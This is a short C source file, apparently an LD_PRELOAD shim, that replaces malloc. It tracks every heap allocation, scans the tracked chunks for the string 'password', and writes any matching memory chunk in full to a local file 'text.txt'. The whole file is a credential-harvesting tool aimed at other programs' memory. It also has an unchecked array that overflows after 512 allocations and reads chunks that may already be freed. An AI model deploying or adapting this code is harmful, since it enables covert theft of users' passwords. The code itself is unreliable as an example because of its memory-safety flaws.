#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

static void* (*real_malloc)(size_t) = NULL;
	
static void init_real_malloc()
{
    if (!real_malloc)
    {
        real_malloc = dlsym(RTLD_NEXT, "malloc");
        if (!real_malloc)
        {
            fprintf(stderr, "Error: Failed to resolve malloc\n");
            exit(1);
        }
    }
}

void* malloc(size_t __size) 
{
	FILE* file;
	void* ptr = NULL;
	static void** arr = NULL;
	static size_t counter = 0;
	static int i = 0;
	char* str = "password";
	int j = 0;
	
	init_real_malloc();
	
    	ptr = real_malloc(__size);
    	if (!ptr) return NULL;
    	
	if (0 == counter)
	{
		arr = real_malloc(1024 * sizeof(void*));
	}
	
	
	counter += 2;
	
	arr[i++] = ptr;
	arr[i++] = (void*)(size_t)__size;
	
	
		for (j = 0; i > 2 && j < i-1; j += 2)
		{
			
			if (memmem((arr[j]), (size_t)arr[j+1], str, strlen(str)))
			{
				file = fopen("text.txt", "ab");
				if (file)
				{
					fprintf(file, "In index: %d\tFull memory chunk:\n", j);
					fwrite(arr[j], sizeof(char), (size_t)arr[j+1], file);
					fclose(file);
				}
			}
		}
	
	return ptr;
}
